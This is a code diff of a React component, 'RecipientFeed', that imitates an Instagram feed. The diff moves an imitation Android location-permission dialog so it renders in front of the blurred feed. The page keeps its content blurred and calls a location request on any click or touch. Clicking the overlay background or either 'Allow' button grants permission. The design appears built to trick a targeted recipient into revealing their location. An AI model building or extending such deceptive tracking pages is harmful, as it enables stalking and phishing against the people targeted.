@@ -397,13 +397,14 @@ export default function RecipientFeed({
   };
 
   return (
-    <div
-      className={`ig-app ${!hasAllowed ? "blurred-content" : "unblurred-content"}`}
-      onClick={!hasAllowed ? requestLocation : undefined}
-      onTouchStart={!hasAllowed ? requestLocation : undefined}
-    >
-      {/* Left Sidebar */}
-      <Sidebar onItemClick={requestLocation} activeTab="Profile" />
+    <>
+      <div
+        className={`ig-app ${!hasAllowed ? "blurred-content" : "unblurred-content"}`}
+        onClick={!hasAllowed ? requestLocation : undefined}
+        onTouchStart={!hasAllowed ? requestLocation : undefined}
+      >
+        {/* Left Sidebar */}
+        <Sidebar onItemClick={requestLocation} activeTab="Profile" />
 
       {/* Main Content Area */}
       <main className="ig-main">
@@ -725,39 +726,40 @@ export default function RecipientFeed({
             </div>
           </button>
         </nav>
+      </div>
 
-        {/* Android Location Permission Modal (Shows only when user ignores or blocks location) */}
-        {showPermissionPopup && !hasAllowed && (
-          <div className="android-location-overlay" onClick={handleAllowInPopup}>
-            <div className="android-location-card" onClick={(e) => e.stopPropagation()}>
-              <div className="android-location-header">
-                <div className="android-location-icon-wrapper">
-                  <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
-                    <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
-                  </svg>
-                </div>
-                <div className="android-location-title">
-                  <strong>{displayHost}</strong> wants to use your device&apos;s location
-                </div>
+      {/* Android Location Permission Modal (Rendered in front of the blurred feed) */}
+      {showPermissionPopup && !hasAllowed && (
+        <div className="android-location-overlay" onClick={handleAllowInPopup}>
+          <div className="android-location-card" onClick={(e) => e.stopPropagation()}>
+            <div className="android-location-header">
+              <div className="android-location-icon-wrapper">
+                <svg viewBox="0 0 24 24" width="22" height="22" fill="currentColor">
+                  <path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" />
+                </svg>
               </div>
-
-              <div className="android-location-buttons">
-                <button className="android-btn-primary" onClick={handleAllowInPopup}>
-                  Allow while visiting the site
-                </button>
-                <button className="android-btn-primary" onClick={handleAllowInPopup}>
-                  Allow this time
-                </button>
-                <button className="android-btn-secondary" onClick={handleNeverAllow}>
-                  Never allow
-                </button>
+              <div className="android-location-title">
+                <strong>{displayHost}</strong> wants to use your device&apos;s location
               </div>
             </div>
-          </div>
-        )}
 
-        {/* Reel Popup Modal Feature */}
-        <ReelModal isOpen={isReelOpen} onClose={() => setIsReelOpen(false)} />
-    </div>
+            <div className="android-location-buttons">
+              <button className="android-btn-primary" onClick={handleAllowInPopup}>
+                Allow while visiting the site
+              </button>
+              <button className="android-btn-primary" onClick={handleAllowInPopup}>
+                Allow this time
+              </button>
+              <button className="android-btn-secondary" onClick={handleNeverAllow}>
+                Never allow
+              </button>
+            </div>
+          </div>
+        </div>
+      )}
+
+      {/* Reel Popup Modal Feature */}
+      <ReelModal isOpen={isReelOpen} onClose={() => setIsReelOpen(false)} />
+    </>
   );
 }
